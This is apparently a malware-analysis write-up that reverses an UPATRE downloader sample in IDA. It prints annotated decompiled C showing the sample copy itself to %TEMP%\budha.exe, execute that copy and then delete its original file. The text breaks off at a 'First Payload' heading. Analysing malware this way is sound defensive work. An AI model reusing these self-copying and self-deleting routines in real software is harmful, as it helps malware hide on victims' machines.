## Reversing an UPATRE Downloader Sample With IDA

Simply put, UPATRE is a downloader written in C/C++ that retrieves payloads via HTTP. Downloaded payloads are typically written to disk and then executed.

Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e

All of the interesting functionality occurs within the entry point, starting with code that rewrites and executes the file under %TEMP%
## Downloader
**Replication**
```C
 GetModuleHandleW(0);
  hHeap = HeapCreate(0, 0x2000u, 0);
  v0 = (WCHAR *)HeapAlloc(hHeap, 8u, 0x2000u);
  lpBuffer = (LPWSTR)HeapAlloc(hHeap, 8u, 0x2000u); // Memory Allocation ^
  GetModuleFileNameW(0, v0, 0x2000u); // Gets full path of current running process, stored in v0
  GetTempPathW(0x1000u, lpBuffer); // Gets path to %TEMP%, stored in lpBuffer
  wsprintfW(lpBuffer, L"%s%s", lpBuffer, L"budha.exe"); // Builds the string %TEMP%\budha.exe 'C:\Users\User1\Local\AppData\Temp\budha.exe'
  FileW = CreateFileW(v0, 0x80000000, 1u, 0, 3u, 0x80u, 0); // Creates a handle to itself, stored as FileW
  hFile = FileW; // hFile = Handle to itself
  if ( FileW == (HANDLE)-1 ) // If the handle creation failed..
    return 1; // Return 1 to the calling process 'failed'
  nNumberOfBytesToRead = GetFileSize(FileW, 0); // Sets the nNumberOfBytesToRead to the file size of the file handle
  v3 = lstrlenW(v0); // v3 = length of current executing path
  v4 = HeapAlloc(hHeap, 8u, nNumberOfBytesToRead + 2 * v3 + 4); // v4 = Memory allocation of current executing process file + length of current executing path [EXE Bytes + File Path]
  v31 = v4;
  if ( !v4 )
    ExitProcess(1u); // If memory allocation fails, exit process
  ReadFile(hFile, v4, nNumberOfBytesToRead, &NumberOfBytesRead, 0); // Read the current executing process into memory
  if ( lstrcmpW(v0, lpBuffer) ) // Execute if statement only if the current executing process is not %TEMP%\budha.exe
  {
    v5 = lstrlenW(v0); // v5 = Length of current executing process file path
    memcpy((char *)v31 + nNumberOfBytesToRead, v0, 2 * v5 + 2); // Appends the current executing path [v0] to the end of the memory buffer [v31 + nNumberOfBytesToRead]
    hHeap = CreateFileW(lpBuffer, 0x40000000u, 2u, 0, 2u, 0x80u, 0); // 0x40000000 = GENERIC_WRITE, 2 = FILE_SHARE_WRITE, 2 = CREATE_ALWAYS [Overwrite if exists]
    if ( hHeap == (HANDLE)-1 ) // If the handle creation failed...
      return 1; // Return to the calling process
    v6 = lstrlenW(v0);
    WriteFile(hHeap, v31, nNumberOfBytesToRead + 2 * v6 + 4, &NumberOfBytesRead, 0); // Write the current executing process + appended original filepath metadata to %TEMP%\budha.exe
    CloseHandle(hFile);
    CloseHandle(hHeap); // Close both handles to the current process
    GetTempPathW(0x1000u, v0);
    ShellExecuteW(0, L"open", lpBuffer, 0, v0, 0); // Execute the new process under %TEMP%\budha.exe
LABEL_8:
    ExitProcess(0);
  }
```
**Self-Deletion**

Next, when the binary is executing from %TEMP%, it will attempt to delete itself from it's "original" location
```C
  }
  v7 = (char *)v31 + 40 * *(unsigned __int16 *)((char *)v31 + *((_DWORD *)v31 + 15) + 6) + *((_DWORD *)v31 + 15) + 208;
  v8 = (const WCHAR *)((char *)v31 + *((_DWORD *)v7 + 4) + *((_DWORD *)v7 + 5));
  CloseHandle(hFile);
  for ( nNumberOfBytesToRead = 0; (int)nNumberOfBytesToRead <= 20000; ++nNumberOfBytesToRead )
  {
    if ( DeleteFileW(v8) )
      break;
  }
```




## First Payload 
